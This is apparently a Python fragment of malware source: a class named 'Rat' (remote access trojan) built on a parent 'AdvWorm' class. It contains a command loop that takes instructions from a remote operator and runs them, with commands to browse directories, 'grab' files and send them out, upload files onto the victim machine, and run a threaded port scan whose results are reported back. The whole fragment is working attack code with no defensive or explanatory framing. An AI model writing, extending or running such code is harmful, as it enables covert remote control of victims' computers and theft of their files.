


class Rat(AdvWorm):
    def __init__(self):
        super().__init__()
        self.name = "RAT"

    def _port_scaner(self, a, b):
        ip = socket.gethostbyname(socket.gethostname())
        serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = ""
        for x in range(a, b):
            print("\nPORT:",x)
            try:
                serv.connect((ip, x))
                result += f"\nOpened Port: {x}"
            except:
                continue
        if result == "":
            return True
        self.send_msg(f"PORT SCAN RESULT [{a} - {b}] : {result} \n------------------------------------------------\n")
    
    def port_scaner(self, a=0, b=65535, th=10):
        self.send_msg(f"Start Scanning Ports {a} - {b}")
        try:
            a = int(a)
            b = int(b)
        except:
            self.send_msg("Error Port range")
            return False
        scaners = []
        for x in range(0, (b-a) // th):
            print(f"RANGE: {a} : {a + th}")
            scan = Thread(target=self._port_scaner, args=(a, a + th), daemon=True)
            scaners.append(scan)
            a += th
        scan = Thread(target=self._port_scaner, args=(a, b+1), daemon=True)
        scaners.append(scan)
        print(f"RANGE: {a} : {b + 1}")  
        for s in scaners:
            s.start()
        
    
    def exec_cmd(self, cmd):
        if cmd.startswith("cd "):
            self.ch_dir(cmd[3:])
        elif cmd == "pwd":
            self.send_msg(self.get_pwd())
        elif cmd == "dir":
            self.show_dir()
        elif cmd.startswith("grab"):
            self.send_file(cmd[5:])
        elif cmd.startswith("up"):
            cmd = cmd.split(" ")
            if len(cmd) > 3:
                self.recive_file(cmd[1], cmd[2], cmd[3])
        elif cmd.startswith("scan"):
            cmd = cmd.split(" ")
            if len(cmd) == 1:
                self.port_scaner()
            elif len(cmd) > 2:
                self.port_scaner(cmd[1], cmd[2])
        else:
            self.send_msg("Unknown Command")
                
    
    def RUN(self):
        self.check_conn()
        while True:
            cmd = self.recive_msg()
            print("CMD:", cmd)
            if not cmd:
                break
            self.exec_cmd(cmd)
        return True